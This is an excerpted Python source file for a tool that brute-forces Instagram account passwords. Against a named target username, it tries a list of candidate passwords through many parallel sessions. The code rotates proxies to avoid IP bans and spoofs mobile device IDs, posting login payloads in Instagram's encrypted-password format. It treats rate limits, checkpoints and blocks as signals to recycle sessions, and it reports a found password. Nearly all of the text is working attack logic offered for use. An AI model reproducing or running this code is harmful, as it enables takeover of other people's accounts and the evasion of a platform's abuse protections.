...
class ProxyPool:
    def __init__(self, proxies=None, proxy_file=None):
        self._proxies = []
        if proxies:
            self._proxies.extend([p.strip() for p in proxies if p and str(p).strip()])
...
class SwarmEngine:
    ...
    def _init_one(self, sw):
        try:
            ...
            csrf = r.cookies.get("csrftoken") or sw.session.cookies.get("csrftoken") or ""
            if not csrf:
    ...
    def burst_open_sessions(self):
        ...
        if len(self.proxy_pool) == 0:
            warn("No proxy pool loaded — high burst will burn your IP quickly")
        ...
        def create_and_init(sid):
            ...
            if sw2.proxy:
                sw2.session.proxies = {"http": sw2.proxy, "https": sw2.proxy}
        ...
        with ThreadPoolExecutor(max_workers=factory_workers) as ex:
            futs = [ex.submit(create_and_init, i) for i in range(self.sessions_n)]
            done_n = 0
            for fut in as_completed(futs):
                ...
                sys.stdout.write(
                    ...
                    % (Colors.OKCYAN, Colors.ENDC, alive, self.sessions_n, done_n, elapsed)
                )
                sys.stdout.flush()
        print()
        ok("Swarm ready · %d live links/sessions · APIs=%d" % (alive, len(self.rotator.endpoints)))
    ...
    def _try_login(self, sw, password):
        ...
        ep = sw.device.endpoint
        ts = int(time.time())
        style = ep.get("style", "web")

        if style == "mobile":
            payload = {
                "jazoest": str(random.randint(22000, 22999)),
                "phone_id": sw.device.phone_id,
                "enc_password": "#PWD_INSTAGRAM:0:%d:%s" % (ts, password),
                "username": self.username,
                "adid": sw.device.family_device_id,
                "guid": sw.device.uuid,
                "device_id": sw.device.android_id,
                "login_attempt_count": "0",
            }
        else:
            payload = {
                "username": self.username,
                "enc_password": "#PWD_INSTAGRAM_BROWSER:0:%d:%s" % (ts, password),
                "queryParams": "{}",
                "optIntoOneTap": "false",
        ...
        try:
            ...
            sw.uses += 1
            return {"status": "error", "password": password, "raw": str(exc), "sid": sw.sid}
        ...
        if r.status_code == 429:
            sw.alive = False
            return {"status": "rate_limit", "password": password, "sid": sw.sid, "api": ep["name"]}
        ...
        try:
            ...
            if r.status_code in (404, 405):
                sw.alive = False
                return {"status": "bad_api", "password": password, "sid": sw.sid, "api": ep["name"]}
            return {"status": "error", "password": password, "sid": sw.sid, "raw": (r.text or "")[:200]}

        if data.get("authenticated") is True or data.get("logged_in_user"):
            return {"status": "ok", "password": password, "sid": sw.sid, "api": ep["name"]}
        if data.get("two_factor_required"):
            return {"status": "two_factor", "password": password, "sid": sw.sid, "api": ep["name"]}
        if data.get("checkpoint_url") or data.get("checkpoint_required"):
            sw.alive = False
            return {"status": "checkpoint", "password": password, "sid": sw.sid, "api": ep["name"]}
        ...
        if data.get("spam") or data.get("error_type") == "ip_block":
            sw.alive = False
            return {"status": "blocked", "password": password, "sid": sw.sid, "api": ep["name"]}
        return {"status": "fail", "password": password, "sid": sw.sid, "api": ep["name"]}
    ...
    def run(self):
        ...
        total = len(self.passwords)
        print("  Target        : %s%s%s" % (Colors.OKGREEN, self.username, Colors.ENDC))
        ...
        print("  Proxies       : %s" % (len(self.proxy_pool) or "none"))
        print()
        ...
        t0 = time.time()
        idx_cursor = self.start_index
        cursor_lock = threading.Lock()
        found_box = {"pwd": None}

        def worker():
            nonlocal idx_cursor
            while not self.stop_flag.is_set() and found_box["pwd"] is None:
                with cursor_lock:
                    if idx_cursor >= total:
                        return
                    i = idx_cursor
                ...
                api_name = str(result.get("api") or sw.device.endpoint.get("name", "?"))

                with self._lock:
                    self.tested += 1
                    tested_n = self.tested
                    done_i = min(total, max(i + 1, self.start_index + tested_n))
                    ...
                    if tested_n % 15 == 0:
                        self._save_progress(idx_cursor)
                ...
                if status == "ok":
                    ...
                    self._log("FOUND | %s | api=%s | sid=%s" % (pwd, api_name, sw.sid))
                    self._release(sw)
                    return
                ...
                if status in ("rate_limit", "blocked", "checkpoint", "bad_api"):
                    sw.alive = False
                    self._log("%s | api=%s | sid=%s" % (status.upper(), api_name, sw.sid))
                    sw = self._recycle(sw)
        ...
        self._save_progress(idx_cursor)
        if found_box["pwd"]:
            success("PASSWORD FOUND: %s%s%s" % (Colors.BOLD, found_box["pwd"], Colors.ENDC))
